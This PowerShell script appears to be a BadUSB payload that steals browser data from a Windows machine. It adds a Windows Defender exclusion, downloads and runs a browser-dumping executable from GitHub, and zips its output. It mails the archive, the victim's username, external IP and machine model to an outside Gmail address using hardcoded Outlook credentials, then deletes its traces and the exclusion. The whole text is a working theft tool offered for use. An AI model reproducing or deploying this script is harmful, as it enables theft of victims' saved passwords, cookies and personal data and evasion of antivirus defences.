#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata"
#Creating the directory we will work on
mkdir "$env:appdata\dump"
Set-Location "$env:appdata\dump"
#Downloading and executing hackbrowser.exe
Invoke-WebRequest -Uri "https://github.com/GamehunterKaan/BadUSB-Browser/blob/main/hackbrowser.exe?raw=true" -OutFile "$env:appdata\dump\hb.exe"
cd $env:appdata\Local\dump
./hb.exe
Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
#Creating A Zip Archive
Compress-Archive -Path * -DestinationPath dump.zip
$Random = Get-Random
#Mailing the output you will need to enable less secure app access on your google account for this to work
$Message = new-object Net.Mail.MailMessage
$smtp = new-object Net.Mail.SmtpClient("smtp.office365.com", 587)
$smtp.Credentials = New-Object System.Net.NetworkCredential("bolalal@outlook.com", "guimaukbr123");
$smtp.EnableSsl = $true
$Message.From = "bolalal@outlook.com"
$Message.To.Add("brunoformiga666@gmail.com")
$ip = Invoke-RestMethod "myexternalip.com/raw"
$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
$Message.Body = $ComputerName
$files=Get-ChildItem 
$Message.Attachments.Add("$env:appdata\dump\dump.zip")
$smtp.Send($Message)
$Message.Dispose()
$smtp.Dispose()
#Cleanup
cd "$env:appdata"
Remove-Item -Path "$env:appdata\dump" -Force -Recurse
Remove-MpPreference -ExclusionPath "$env:appdata"
